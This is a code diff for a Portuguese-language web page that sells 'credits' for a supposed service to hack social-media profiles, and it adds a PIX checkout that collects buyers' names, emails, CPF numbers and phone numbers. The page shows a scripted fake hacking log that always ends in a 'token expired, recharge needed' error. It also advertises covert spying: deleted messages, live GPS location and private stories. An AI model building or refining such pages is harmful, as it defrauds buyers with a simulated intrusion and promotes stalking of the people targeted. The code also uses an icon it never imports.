@@ -1,13 +1,17 @@
 import React, { useState, useEffect } from 'react';
-import { Zap, Infinity, Star, ChevronRight, Check, ShieldAlert, Search, Sparkles, Coins, AlertCircle, Eye, ShieldCheck } from 'lucide-react';
+import { Zap, Infinity, Star, ChevronRight, Check, ShieldAlert, Search, Sparkles, Coins, AlertCircle, Eye, ShieldCheck, X, User, Mail, CreditCard, Phone } from 'lucide-react';
 import toast from 'react-hot-toast';
 import { motion, AnimatePresence } from 'framer-motion';
+import { supabase } from '../integrations/supabase/client';
+import PixPaymentDisplay from '../components/PixPaymentDisplay';
+import { trackLead } from '../services/trackingService';
 
 interface CreditPackage {
   id: number;
   amount: number | string;
   title: string;
   price: string;
+  numericPrice: number;
   description: string;
   checkoutUrl: string;
   icon: React.ElementType;
@@ -19,6 +23,18 @@ const CreditsPage: React.FC = () => {
   const [stage, setStage] = useState<'idle' | 'searching' | 'error'>('idle');
   const [targetUsername, setTargetUsername] = useState('');
   const [searchLogs, setSearchLogs] = useState<string[]>([]);
+  
+  // Estados para o Checkout PIX
+  const [selectedPackage, setSelectedPackage] = useState<CreditPackage | null>(null);
+  const [showCheckoutModal, setShowCheckoutModal] = useState(false);
+  const [isGeneratingPix, setIsGeneratingPix] = useState(false);
+  const [pixResult, setPixResult] = useState<any>(null);
+  const [formData, setFormData] = useState({
+    nome: '',
+    email: '',
+    documento: '',
+    whatsapp: ''
+  });
 
   const creditPackages: CreditPackage[] = [
     {
@@ -26,6 +42,7 @@ const CreditsPage: React.FC = () => {
       amount: 10,
       title: "PROTOCOLO LITE",
       price: "R$ 49,50",
+      numericPrice: 49.50,
       description: "Infiltração básica para monitoramento rápido.",
       checkoutUrl: "https://checkout.perfectpay.com.br/pay/PPU38COTFU1",
       icon: Zap,
@@ -36,21 +53,23 @@ const CreditsPage: React.FC = () => {
       amount: 30,
       title: "PROTOCOLO ELITE",
       price: "R$ 79,50",
+      numericPrice: 79.50,
       description: "Vigilância avançada com recuperação de arquivos.",
       checkoutUrl: "https://checkout.perfectpay.com.br/pay/PPU38COTFU6",
       icon: Star,
       highlight: true,
-      features: ['Tudo do Protocolo Lite', 'Recuperar Mensagens Apagadas', 'Localização GPS em Tempo Real', 'Ver Fotos Temporárias (Modo Ghost)', 'Acesso ao Close Friends']
+      features: ['Tudo do Protocolo Lite', 'Recuperar Mensagens Apagadas', 'Localização GPS em Tempo Real', 'Ver Fotos Temporárias', 'Acesso ao Close Friends']
     },
     {
       id: 3,
       amount: "Ilimitados",
       title: "DOMINAÇÃO TOTAL",
       price: "R$ 149,00",
+      numericPrice: 149.00,
       description: "Controle absoluto e permanente sem restrições.",
       checkoutUrl: "https://checkout.perfectpay.com.br/pay/PPU38COTFU8",
       icon: Infinity,
-      features: ['Acesso Vitalício (Sem Mensalidade)', 'Recuperar TODO o Histórico Deletado', 'Monitorar Vários Perfis ao Mesmo Tempo', 'Notificações de Novas Mensagens', 'Rastreamento Veicular por Placa']
+      features: ['Acesso Vitalício', 'Recuperar TODO o Histórico', 'Monitorar Vários Perfis', 'Notificações em Tempo Real', 'Rastreamento por Placa']
     },
   ];
 
@@ -66,12 +85,11 @@ const CreditsPage: React.FC = () => {
   useEffect(() => {
     if (stage === 'searching') {
       const logs = [
-        `Iniciando varredura de satélite no perfil @${targetUsername}...`,
-        `Identificando vulnerabilidades no servidor Meta...`,
-        `Quebrando firewall de autenticação de dois fatores...`,
-        `Acessando banco de dados de mensagens criptografadas...`,
-        `Extraindo histórico de localização em tempo real...`,
-        `ERRO CRÍTICO: Token de acesso expirado. Recarga necessária.`,
+        `Iniciando varredura no perfil @${targetUsername}...`,
+        `Identificando vulnerabilidades no servidor...`,
+        `Quebrando firewall de autenticação...`,
+        `Extraindo histórico de localização...`,
+        `ERRO CRÍTICO: Token expirado. Recarga necessária.`,
       ];
 
       let currentLog = 0;
@@ -94,13 +112,185 @@ const CreditsPage: React.FC = () => {
     }
   }, [stage, targetUsername]);
 
-  const handleCardClick = (url: string) => {
-    window.open(url, '_blank');
+  const handlePackageSelection = (pkg: CreditPackage) => {
+    setSelectedPackage(pkg);
+    setShowCheckoutModal(true);
   };
+
+  const handleGeneratePix = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!formData.nome || !formData.email || !formData.documento) {
+      toast.error("Preencha todos os campos.");
+      return;
+    }
+
+    setIsGeneratingPix(true);
+    const toastId = toast.loading("Gerando seu PIX...");
+
+    try {
+      const currentLeadId = sessionStorage.getItem('current_lead_id');
+      
+      // Salva o lead antes de gerar
+      await trackLead({
+        full_name: formData.nome,
+        email: formData.email,
+        phone: formData.whatsapp,
+        document: formData.documento,
+        status: 'gerou_pix_creditos',
+        amount: selectedPackage?.numericPrice
+      });
+
+      const { data, error } = await supabase.functions.invoke('royal-banking-payment', {
+        body: { 
+          name: formData.nome,
+          email: formData.email,
+          document: formData.documento,
+          phone: formData.whatsapp,
+          amount: selectedPackage?.numericPrice,
+          leadId: currentLeadId
+        },
+      });
+
+      if (error || !data.paymentCode) throw new Error('Falha ao gerar pagamento');
+
+      setPixResult({
+        paymentCode: data.paymentCode,
+        paymentCodeBase64: data.paymentCodeBase64,
+        idTransaction: data.idTransaction,
+        amount: selectedPackage?.numericPrice
+      });
+
+      toast.success("PIX Gerado com sucesso!", { id: toastId });
+    } catch (err) {
+      toast.error("Erro no servidor. Tente novamente.", { id: toastId });
+    } finally {
+      setIsGeneratingPix(false);
+    }
+  };
+
+  const maskCPF = (v: string) => {
+    v = v.replace(/\D/g, "");
+    if (v.length <= 11) {
+      v = v.replace(/(\d{3})(\d)/, "$1.$2");
+      v = v.replace(/(\d{3})(\d)/, "$1.$2");
+      v = v.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
+    }
+    return v;
+  };
+
+  if (pixResult) {
+    return (
+      <div className="min-h-screen bg-[#0f0f12] flex flex-col items-center justify-center p-4">
+        <PixPaymentDisplay 
+          paymentCode={pixResult.paymentCode}
+          paymentCodeBase64={pixResult.paymentCodeBase64}
+          transactionId={pixResult.idTransaction}
+          amount={pixResult.amount}
+          onConfirm={() => toast.success("Aguardando confirmação do banco...")}
+        />
+        <button 
+          onClick={() => setPixResult(null)}
+          className="mt-8 text-gray-500 hover:text-white text-xs font-bold uppercase tracking-widest"
+        >
+          Voltar para pacotes
+        </button>
+      </div>
+    );
+  }
 
   return (
     <div className="min-h-screen bg-transparent text-white font-sans overflow-x-hidden selection:bg-blue-500/30">
       
+      {/* Modal de Checkout */}
+      <AnimatePresence>
+        {showCheckoutModal && selectedPackage && (
+          <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/95 backdrop-blur-md">
+            <motion.div 
+              initial={{ scale: 0.9, opacity: 0 }}
+              animate={{ scale: 1, opacity: 1 }}
+              exit={{ scale: 0.9, opacity: 0 }}
+              className="bg-[#0f0f12] border border-white/10 w-full max-w-md rounded-[2.5rem] overflow-hidden shadow-2xl"
+            >
+              <div className="p-8">
+                <div className="flex justify-between items-center mb-8">
+                  <div>
+                    <h3 className="text-xl font-black text-white uppercase tracking-tighter">Finalizar Recarga</h3>
+                    <p className="text-[10px] text-gray-500 font-bold uppercase tracking-widest">{selectedPackage.title}</p>
+                  </div>
+                  <button onClick={() => setShowCheckoutModal(false)} className="p-2 bg-white/5 rounded-full hover:bg-white/10 transition-colors"><X size={20} /></button>
+                </div>
+
+                <form onSubmit={handleGeneratePix} className="space-y-4">
+                  <div className="relative group">
+                    <User className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
+                    <input 
+                      type="text" 
+                      placeholder="NOME COMPLETO"
+                      required
+                      value={formData.nome}
+                      onChange={(e) => setFormData({...formData, nome: e.target.value})}
+                      className="w-full bg-white/5 border border-white/10 rounded-xl py-4 pl-12 pr-4 text-xs font-bold outline-none focus:border-blue-500 transition-all uppercase"
+                    />
+                  </div>
+                  <div className="relative group">
+                    <Mail className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
+                    <input 
+                      type="email" 
+                      placeholder="E-MAIL"
+                      required
+                      value={formData.email}
+                      onChange={(e) => setFormData({...formData, email: e.target.value})}
+                      className="w-full bg-white/5 border border-white/10 rounded-xl py-4 pl-12 pr-4 text-xs font-bold outline-none focus:border-blue-500 transition-all lowercase"
+                    />
+                  </div>
+                  <div className="relative group">
+                    <CreditCard className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
+                    <input 
+                      type="text" 
+                      placeholder="CPF"
+                      required
+                      value={formData.documento}
+                      onChange={(e) => setFormData({...formData, documento: maskCPF(e.target.value)})}
+                      className="w-full bg-white/5 border border-white/10 rounded-xl py-4 pl-12 pr-4 text-xs font-bold outline-none focus:border-blue-500 transition-all"
+                    />
+                  </div>
+                  <div className="relative group">
+                    <Phone className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
+                    <input 
+                      type="tel" 
+                      placeholder="WHATSAPP"
+                      value={formData.whatsapp}
+                      onChange={(e) => setFormData({...formData, whatsapp: e.target.value})}
+                      className="w-full bg-white/5 border border-white/10 rounded-xl py-4 pl-12 pr-4 text-xs font-bold outline-none focus:border-blue-500 transition-all"
+                    />
+                  </div>
+
+                  <div className="py-6 border-t border-white/5 mt-6">
+                    <div className="flex justify-between items-center mb-6">
+                       <span className="text-xs font-bold text-gray-500 uppercase">Total:</span>
+                       <span className="text-2xl font-black text-white">{selectedPackage.price}</span>
+                    </div>
+                    
+                    <button 
+                      type="submit"
+                      disabled={isGeneratingPix}
+                      className="w-full bg-blue-600 hover:bg-blue-700 text-white font-black py-4 rounded-xl flex items-center justify-center gap-2 shadow-xl shadow-blue-600/20 active:scale-95 transition-all"
+                    >
+                      {isGeneratingPix ? <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" /> : <><QrCode size={18} /> GERAR PIX AGORA</>}
+                    </button>
+                  </div>
+                </form>
+
+                <div className="flex items-center justify-center gap-2 mt-2">
+                  <ShieldCheck className="w-3 h-3 text-green-500" />
+                  <span className="text-[8px] font-bold text-gray-600 uppercase tracking-widest">Pagamento 100% Criptografado</span>
+                </div>
+              </div>
+            </motion.div>
+          </div>
+        )}
+      </AnimatePresence>
+
       <main className="relative z-10 max-w-xl mx-auto px-6 py-12 flex flex-col items-center">
         
         {/* Logo Header */}
@@ -151,7 +341,7 @@ const CreditsPage: React.FC = () => {
                 VIGILÂNCIA <span className="text-[#3b82f6]">TOTAL</span>
               </h2>
               <p className="text-gray-300 text-lg font-bold mb-10 max-w-md mx-auto leading-tight">
-                Extraia conversas secretas, fotos apagadas e localização exata sem deixar nenhum rastro. <span className="text-blue-500">A verdade está a um clique.</span>
+                Extraia conversas secretas, fotos apagadas e localização exata. <span className="text-blue-500">A verdade está a um clique.</span>
               </p>
               
               <div className="space-y-6 w-full max-w-md mx-auto">
@@ -236,11 +426,10 @@ const CreditsPage: React.FC = () => {
                 {creditPackages.map((pkg) => (
                   <motion.div
                     key={pkg.id}
-                    onClick={() => handleCardClick(pkg.checkoutUrl)}
+                    onClick={() => handlePackageSelection(pkg)}
                     className={`relative bg-white/5 border-[1.5px] rounded-[2.5rem] p-8 flex flex-col transition-all duration-300 cursor-pointer group
                       ${pkg.highlight ? 'border-[#3b82f6] bg-white/[0.08] shadow-[0_0_30px_rgba(59,130,246,0.1)]' : 'border-white/5 hover:border-white/20'}`}
                   >
-                    {/* Badge de Melhor Custo Benefício */}
                     {pkg.highlight && (
                       <div className="absolute top-0 right-10 -translate-y-1/2 bg-[#3b82f6] text-white text-[9px] font-black px-4 py-1.5 rounded-full uppercase tracking-[0.2em] shadow-xl shadow-blue-600/40 z-20">
                         Melhor Custo Benefício
